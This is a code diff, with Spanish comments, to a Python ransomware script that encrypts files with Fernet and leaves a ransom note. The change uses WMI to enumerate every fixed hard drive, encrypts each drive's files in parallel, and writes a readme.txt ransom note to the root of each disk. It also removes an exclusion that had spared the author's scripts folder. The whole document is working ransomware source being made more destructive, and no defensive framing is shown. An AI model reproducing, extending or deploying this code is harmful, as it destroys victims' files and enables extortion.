@@ -1,6 +1,8 @@
 import os
 from cryptography.fernet import Fernet
 from concurrent.futures import ThreadPoolExecutor
+import wmi
+
 
 EXCLUIR_CARPETAS = [
     'Program Files',
@@ -9,7 +11,6 @@ EXCLUIR_CARPETAS = [
     '$Recycle.Bin',
     'AppData',
     'logs',
-    'C:\\Users\\rafa\\Desktop\\scripts'  # Carpeta adicional a excluir
 ]
 
 EXTENSIONES_PERMITIDAS = [
@@ -61,20 +62,24 @@ def obtener_archivos_en_directorio(path):
     return archivos
 
 if __name__ == "__main__":
-    # Directorio que se va a encriptar
-    path_to_encrypt = "C:\\Users"
-
-    # Obtener todos los archivos en el directorio y subdirectorios
-    items = obtener_archivos_en_directorio(path_to_encrypt)
+    c = wmi.WMI()
+    # Obtener los discos duros
+    disks = [drive.DeviceID for drive in c.Win32_LogicalDisk() if drive.DriveType == 3]
 
     # Generar y cargar la llave
     generar_llave()
     key = cargar_llave()
 
-    # Encriptar los archivos en paralelo usando ThreadPoolExecutor
-    with ThreadPoolExecutor() as executor:
-        executor.map(lambda item: encriptar_archivo(item, key), items)
-    ransom_note = """
+    for i in disks:
+        #obtener todos los archivos
+        items = obtener_archivos_en_directorio(i)
+
+        #Encriptacion en paralelo
+        with ThreadPoolExecutor() as executor:
+            executor.map(lambda item: encriptar_archivo(item, key), items)
+
+        # Crear archivo de radme en cada uno de los DD
+        ransom_note = """
     ------------------------------------------
               ¡ATENCIÓN!
     ------------------------------------------
@@ -139,8 +144,6 @@ dooooooooooooooooooooooooo&@@oooooob
        `doooooooob dooooooob'
          `"""""""' `""""""'
     """
-    
-
-    # Crear el archivo de readme en el directorio de trabajo actual
-    with open("readme.txt", "w") as file:
-        file.write(ransom_note)
+        readme_path = os.path.join(i, "readme.txt")
+        with open(readme_path, "w") as file:
+            file.write(ransom_note)
